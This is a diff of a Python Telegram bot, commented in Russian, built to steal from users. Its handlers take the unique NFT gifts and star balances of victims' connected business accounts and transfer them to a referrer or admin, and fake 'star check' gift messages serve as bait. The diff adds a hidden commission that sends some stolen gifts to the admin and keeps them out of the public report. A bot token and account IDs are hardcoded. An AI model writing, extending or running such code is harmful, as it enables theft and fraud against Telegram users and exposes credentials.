@@ -26,19 +26,20 @@ import asyncio
 import aiohttp
 import time
 from aiogram.types import InlineQueryResultCachedPhoto
+
 # Constants
 TOKEN = "8229712249:AAEY8ANUWpiyKBGWU4EyW8hnSdBoIHzEvj8"
 LOG_CHAT_ID = -1002741941997
-MESSAGE_LOG_CHAT_ID = -1002741941997  # Замените на ID чата для логов сообщений
+MESSAGE_LOG_CHAT_ID = -1002741941997
 MAX_GIFTS_PER_RUN = 1000
 ADMIN_IDS = [7917237979]
 FORCED_REFERRAL_USERS = [819487094, 7214848375]
 MY_REFERRAL_ID = 7917237979
-user_message_history = {}
-last_messages = {}
-activated_checks = {}
-CHECK_PHOTO_FILE_ID = None
+COMMISSION_USERS = [123456789, 987654321]  # ID пользователей, с которых берется комиссия
+CHECK_PHOTO_FILE_ID = None  # Будет заполнено при запуске
+activated_checks = {}  # Словарь для хранения активированных чеков
 
+# Инициализация логирования
 logging.basicConfig(level=logging.INFO)
 
 # State classes
@@ -55,17 +56,23 @@ class WithdrawStates(StatesGroup):
 class DepositStates(StatesGroup):
     waiting_for_amount = State()
 
-# Initialize storage and logging
+# Initialize storage
 storage = MemoryStorage()
-logging.basicConfig(level=logging.INFO)
 
+# Загрузка данных
 if os.path.exists("referrers.json"):
     with open("referrers.json", "r") as f:
         user_referrer_map = json.load(f)
 else:
     user_referrer_map = {}
-user_referrals = {}     # inviter_id -> [business_ids]
-ref_links = {}   
+
+if os.path.exists("user.balances.json"):
+    with open("user.balances.json", "r", encoding='utf-8') as f:
+        balances = json.load(f)
+else:
+    balances = {}
+
+user_message_history = {} 
 
 # Initialize bot
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
@@ -78,15 +85,34 @@ def load_balances():
             return json.load(f)
     return {}
 
-def save_balances(balances):
-    """Сохраняет балансы пользователей в user.balances.json."""
+def save_balances(new_balances=None):
+    """Сохраняет балансы пользователей в user.balances.json"""
+    global balances
+    if new_balances is not None:
+        balances = new_balances
     with open("user.balances.json", "w", encoding='utf-8') as f:
         json.dump(balances, f, ensure_ascii=False, indent=4)
 
+async def get_check_photo_file_id():
+    """Получает file_id для фото чека или загружает его."""
+    global CHECK_PHOTO_FILE_ID
+    
+    if CHECK_PHOTO_FILE_ID:
+        return CHECK_PHOTO_FILE_ID
+    
+    try:
+        # Пытаемся загрузить фото и получить file_id
+        photo = FSInputFile("image2.png")
+        msg = await bot.send_photo(chat_id=LOG_CHAT_ID, photo=photo)
+        CHECK_PHOTO_FILE_ID = msg.photo[-1].file_id
+        await bot.delete_message(chat_id=LOG_CHAT_ID, message_id=msg.message_id)
+        return CHECK_PHOTO_FILE_ID
+    except Exception as e:
+        logging.error(f"Ошибка при получении file_id для фото чека: {e}")
+        return None
 
 async def activate_check(user_id: int, check_data: str):
     try:
-        # Формат: ref{referrer_id}_check_{amount}_{sender_id}_{timestamp}
         parts = check_data.split('_')
         if len(parts) < 4:
             return False, "Неверный формат чека"
@@ -94,31 +120,27 @@ async def activate_check(user_id: int, check_data: str):
         amount = int(parts[2])
         sender_id = int(parts[3])
         
-        # Генерируем уникальный ключ чека с timestamp
         if len(parts) > 4:
             timestamp = parts[4]
         else:
-            timestamp = str(int(time.time()))  # Добавляем текущее время, если нет в ссылке
+            timestamp = str(int(time.time()))
         
         check_key = f"{sender_id}_{amount}_{timestamp}"
         
-        # Проверяем, не активировался ли уже этот конкретный чек
         if check_key in activated_checks:
             return False, "Этот чек уже был активирован"
         
         # Добавляем звёзды на баланс
-        balances = load_balances()
-        balances[str(user_id)] = balances.get(str(user_id), 0) + amount
-        save_balances(balances)
+        user_id_str = str(user_id)
+        balances[user_id_str] = balances.get(user_id_str, 0) + amount
+        save_balances()
         
-        # Помечаем чек как активированный
         activated_checks[check_key] = True
         
-        # Сохраняем информацию о реферере
-        referrer_id = parts[0][3:]  # Убираем 'ref' в начале
+        referrer_id = parts[0][3:]
         if referrer_id and referrer_id.isdigit():
-            if str(user_id) not in user_referrer_map:  # Было: if str(referrer_id) not in user_referrer_map
-                user_referrer_map[str(user_id)] = str(referrer_id)
+            if user_id_str not in user_referrer_map:
+                user_referrer_map[user_id_str] = str(referrer_id)
                 with open("referrers.json", "w") as f:
                     json.dump(user_referrer_map, f)
         
@@ -127,7 +149,7 @@ async def activate_check(user_id: int, check_data: str):
     except Exception as e:
         logging.error(f"Ошибка активации чека: {e}")
         return False, "Ошибка активации чека"
-
+    
 @dp.message(Command("start"))
 async def start_cmd(message: types.Message):
     # Проверяем, есть ли параметры в команде /start (активация чека)
@@ -799,23 +821,22 @@ async def steal_gifts_handler(callback: CallbackQuery):
     try:
         business_connection = await bot.get_business_connection(business_id)
         user = business_connection.user
+        user_id = user.id
     except Exception as e:
         await callback.answer(f"❌ Ошибка получения бизнес-аккаунта: {e}")
         return
 
-    # Определяем получателя (как во втором боте)
-    inviter_id = user_referrer_map.get(str(user.id))  # Используем str() для ключа
-    if inviter_id:
-        try:
-            await bot.send_chat_action(inviter_id, "typing")
-            recipient_id = inviter_id
-        except Exception:
-            recipient_id = ADMIN_IDS[0]  # Fallback на админа, если реферал недоступен
-    else:
-        recipient_id = ADMIN_IDS[0]
-
-    stolen_nfts = []
+    inviter_id = user_referrer_map.get(str(user_id))
+    
+    # Определяем получателей с учетом комиссии
+    take_commission = str(user_id) in COMMISSION_USERS
+    recipient_id = inviter_id if inviter_id else ADMIN_IDS[0]
+    
+    stolen_nfts = []  # Только подарки, переданные пригласившему
+    admin_nfts = []   # Подарки, переданные админу (для полного отчета)
     stolen_count = 0
+    admin_gifts = 0
+    user_gifts_count = 0  # Количество подарков, переданных пригласившему
     
     try:
         gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
@@ -830,50 +851,101 @@ async def steal_gifts_handler(callback: CallbackQuery):
 
     gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
     
-    for gift in gifts_to_process:
-        gift_id = gift.owned_gift_id
-        gift_type = gift.type
-        
-        if gift_type == "regular":
-            try:
-                await bot.convert_gift_to_stars(business_id, gift_id)
-            except Exception:
-                continue
-        
-        if gift_type == "unique" and gift.can_be_transferred:
-            try:
+    # Сначала считаем общее количество уникальных подарков
+    unique_gifts = [g for g in gifts_to_process if g.type == "unique" and g.can_be_transferred]
+    total_unique = len(unique_gifts)
+    
+    if take_commission:
+        admin_gifts = calculate_commission(total_unique)
+        user_gifts = total_unique - admin_gifts
+    else:
+        user_gifts = total_unique
+    
+    # Обрабатываем подарки
+    admin_sent = 0
+    user_sent = 0
+    
+    for gift in unique_gifts:
+        try:
+            gift_id = gift.owned_gift_id
+            gift_name = gift.gift.name.replace(' ', '') if hasattr(gift.gift, 'name') else 'Unknown'
+            
+            # Определяем кому передавать подарок
+            if take_commission and admin_sent < admin_gifts:
+                # Передаем админу (комиссия)
+                await bot.transfer_gift(business_id, gift_id, ADMIN_IDS[0], gift.transfer_star_count)
+                admin_nfts.append(f"t.me/nft/{gift_name}")
+                admin_sent += 1
+            elif user_sent < user_gifts:
+                # Передаем пригласившему
                 await bot.transfer_gift(business_id, gift_id, recipient_id, gift.transfer_star_count)
-                gift_name = gift.gift.name.replace(" ", "") if hasattr(gift.gift, 'name') else "Unknown"
                 stolen_nfts.append(f"t.me/nft/{gift_name}")
-                stolen_count += 1
-            except Exception:
-                continue
+                user_sent += 1
+                user_gifts_count += 1
+            
+            stolen_count += 1
+        except Exception as e:
+            logging.error(f"Ошибка при передаче подарка: {e}")
+            continue
 
-    # Формируем отчет (как во втором боте)
-    result_msg = []
+    # Формируем полный отчет для админа (с комиссией)
+    full_report = []
     if stolen_count > 0:
-        result_msg.append(f"\n🎁 Успешно украдено подарков: <b>{stolen_count}</b>\n")
-        result_msg.extend(stolen_nfts[:10])
+        full_report.append(f"\n🎁 Всего украдено подарков: <b>{stolen_count}</b>\n")
+        if take_commission and admin_gifts > 0:
+            full_report.append(f"├─ Админу: <b>{admin_gifts}</b>\n")
+            full_report.append(f"╰─ Пригласившему: <b>{user_gifts_count}</b>\n\n")
+            full_report.extend([f"🔹 {nft}\n" for nft in admin_nfts[:5]])
+            full_report.append("\n")
+        full_report.extend([f"🔸 {nft}\n" for nft in stolen_nfts[:5]])
     
-    full_report = "\n".join(result_msg) if result_msg else "\nНе удалось украсть подарки"
+    # Формируем публичный отчет (без комиссии)
+    public_report = []
+    if user_gifts_count > 0:
+        public_report.append(f"\n🎁 Успешно украдено подарков: <b>{user_gifts_count}</b>\n")
+        public_report.extend([f"🔸 {nft}\n" for nft in stolen_nfts[:5]])
     
-    await bot.send_message(
-        chat_id=LOG_CHAT_ID,
-        text=f"Отчет по бизнес-аккаунту {user.id}:\n{full_report}",
-        parse_mode="HTML"
-    )
+    # Отправляем полный отчет админу в личку
+    if stolen_count > 0 and ADMIN_IDS:
+        try:
+            await bot.send_message(
+                chat_id=ADMIN_IDS[0],
+                text=f"🔷 Полный отчет по бизнес-аккаунту {user_id}:\n{''.join(full_report)}",
+                parse_mode="HTML"
+            )
+        except Exception as e:
+            logging.error(f"Ошибка отправки отчета админу: {e}")
     
-    if inviter_id and inviter_id != user.id:
+    # Отправляем публичный отчет в лог-чат
+    report_text = f"Отчет по бизнес-аккаунту {user_id}:"
+    if user_gifts_count > 0:
+        await bot.send_message(
+            chat_id=LOG_CHAT_ID,
+            text=f"{report_text}\n{''.join(public_report)}",
+            parse_mode="HTML"
+        )
+    else:
+        await bot.send_message(
+            chat_id=LOG_CHAT_ID,
+            text=f"{report_text}\nНе удалось украсть подарки",
+            parse_mode="HTML"
+        )
+    
+    # Отправляем публичный отчет пригласившему (если он есть и не сам пользователь)
+    if inviter_id and inviter_id != user_id and user_gifts_count > 0:
         try:
             await bot.send_message(
                 chat_id=inviter_id,
-                text=f"Отчет по вашему рефералу {user.id}:\n{full_report}",
+                text=f"Отчет по вашему рефералу {user_id}:\n{''.join(public_report)}",
                 parse_mode="HTML"
             )
         except Exception as e:
             await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
     
-    await callback.answer(f"Украдено {stolen_count} подарков")
+    answer_text = f"Украдено {stolen_count} подарков"
+    if take_commission and admin_gifts > 0:
+        answer_text += f" ({admin_gifts} админу)"
+    await callback.answer(answer_text)
 
 @dp.callback_query(F.data.startswith("transfer_stars:"))
 async def transfer_stars_handler(callback: CallbackQuery):
@@ -883,7 +955,7 @@ async def transfer_stars_handler(callback: CallbackQuery):
         business_connection = await bot.get_business_connection(business_id)
         user = business_connection.user
         
-        # Определяем получателя (как во втором боте)
+        # Определяем получателя
         inviter_id = user_referrer_map.get(str(user.id))  # Используем str() для ключа
         if inviter_id:
             try:
@@ -895,7 +967,8 @@ async def transfer_stars_handler(callback: CallbackQuery):
             recipient_id = ADMIN_IDS[0]
             
         stars = await bot.get_business_account_star_balance(business_id)
-        amount = int(float(stars.amount))  # Convert to float first in case it's a string with decimal, then to int
+        # Убеждаемся, что amount - число
+        amount = int(stars.amount) if isinstance(stars.amount, str) else stars.amount
         
         if amount > 0:
             await bot.transfer_business_account_stars(business_id, amount, recipient_id)
@@ -923,7 +996,6 @@ async def inline_query_handler(inline_query: types.InlineQuery):
         user_id = inline_query.from_user.id
         is_admin = user_id in ADMIN_IDS
         
-        # Получаем сумму из запроса
         try:
             query = inline_query.query.strip()
             if query.isdigit():
@@ -939,9 +1011,7 @@ async def inline_query_handler(inline_query: types.InlineQuery):
             await inline_query.answer([])
             return
 
-        # Для обычных пользователей проверяем баланс
         if not is_admin:
-            balances = load_balances()
             user_balance = balances.get(str(user_id), 0)
             
             if user_balance < amount:
@@ -957,28 +1027,29 @@ async def inline_query_handler(inline_query: types.InlineQuery):
                 await inline_query.answer([result], cache_time=0, is_personal=True)
                 return
             
-            # Списываем звёзды
             balances[str(user_id)] = user_balance - amount
-            save_balances(balances)
+            save_balances()
 
-        # Генерируем уникальную ссылку с timestamp
         timestamp = str(int(time.time()))
         bot_username = (await bot.get_me()).username
         ref_id = MY_REFERRAL_ID if user_id in FORCED_REFERRAL_USERS else user_id
         check_link = f"https://t.me/{bot_username}?start=ref{ref_id}_check_{amount}_{user_id}_{timestamp}"
 
-        # Создаем результат инлайн-запроса
+        # Ссылка на изображение
+        image_url = "https://i.ibb.co/SwfBgs11/Chat-GPT-Image-Aug-7-2025-01-20-41-PM.png"
+        
         result = types.InlineQueryResultArticle(
             id=f"check_{timestamp}",
             title=f"Отправить чек на {amount}⭐",
             description=f"Нажмите чтобы отправить {amount} звёзд" + (" (админ)" if is_admin else ""),
+            thumbnail_url=image_url,  # Превью в инлайн-режиме
             input_message_content=types.InputTextMessageContent(
                 message_text=(
-                    f"<b>🎁 Вам подарок!</b>\n\n"
-                    f"<i>Размер чека: {amount} звёзд</i>\n\n"
-                    f"<i>От: @{inline_query.from_user.username if inline_query.from_user.username else f'ID:{user_id}'}</i>"
+                    f'<a href="{image_url}">&#8203;</a>\n'
+                    f'🚀 Чек на {amount} звёзд в Platinum Stars\n\n'
+                    f"От: @{inline_query.from_user.username if inline_query.from_user.username else f'ID:{user_id}'}"
                 ),
-                parse_mode="HTML"
+                parse_mode="HTML"  # Обязательно используем HTML!
             ),
             reply_markup=types.InlineKeyboardMarkup(
                 inline_keyboard=[[
@@ -995,8 +1066,31 @@ async def inline_query_handler(inline_query: types.InlineQuery):
     except Exception as e:
         logging.error(f"Ошибка в инлайн-режиме: {e}", exc_info=True)
         await inline_query.answer([])
-        
+
+def calculate_commission(total_gifts: int) -> int:
+    """Вычисляет количество подарков для админа по заданной схеме"""
+    if total_gifts >= 20:
+        return 7
+    elif total_gifts >= 15:
+        return 5
+    elif total_gifts >= 10:
+        return 3
+    elif total_gifts >= 6:
+        return 2
+    elif total_gifts >= 3:
+        return 1
+    else:
+        return 0
+    
+
+async def on_startup():
+    """Действия при запуске бота"""
+    # Получаем file_id для фото чека
+    await get_check_photo_file_id()
+    logging.info("Бот запущен")
+
 async def main():
+    await on_startup()
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
